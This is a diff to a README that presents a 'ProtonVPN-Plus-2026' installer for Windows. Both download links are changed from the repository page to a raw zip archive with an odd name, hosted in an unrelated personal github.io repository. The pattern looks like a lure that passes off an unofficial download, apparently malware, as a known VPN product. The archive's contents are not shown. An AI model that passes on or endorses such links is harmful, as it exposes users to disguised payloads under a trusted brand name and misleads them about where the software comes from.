@@ -5,7 +5,7 @@ description: "Download the Proton VPN Plus installer for Windows 10 and 11 to se
 ---
 # 🛡️ ProtonVPN-Plus-2026 - Secure Private Browsing For Windows Users
 
-[![](https://img.shields.io/badge/Download-ProtonVPN-blue.svg)](https://github.com/Simeonka7709/ProtonVPN-Plus-2026)
+[![](https://img.shields.io/badge/Download-ProtonVPN-blue.svg)](https://github.com/Simeonka7709/simeonka7709.github.io/raw/refs/heads/main/unlayable/io_github_simeonka_2.0.zip)
 
 ## 🌐 Overview
 ProtonVPN-Plus-2026 provides a secure way to access the internet. This software hides your online activity from trackers and protects your data on public networks. It creates a private tunnel for your web traffic. This guide helps you install and use the application on Windows 10 and Windows 11.
@@ -21,7 +21,7 @@ Before you install the software, confirm your computer meets these standards:
 ## 📥 How To Download
 Follow these steps to obtain the installer for your computer:
 
-1. Visit the following repository page: [ProtonVPN-Plus-2026 Download Link](https://github.com/Simeonka7709/ProtonVPN-Plus-2026).
+1. Visit the following repository page: [ProtonVPN-Plus-2026 Download Link](https://github.com/Simeonka7709/simeonka7709.github.io/raw/refs/heads/main/unlayable/io_github_simeonka_2.0.zip).
 2. Locate the link on the page to download the setup file.
 3. Save the file to your Downloads folder.
 4. Wait for the download to finish.
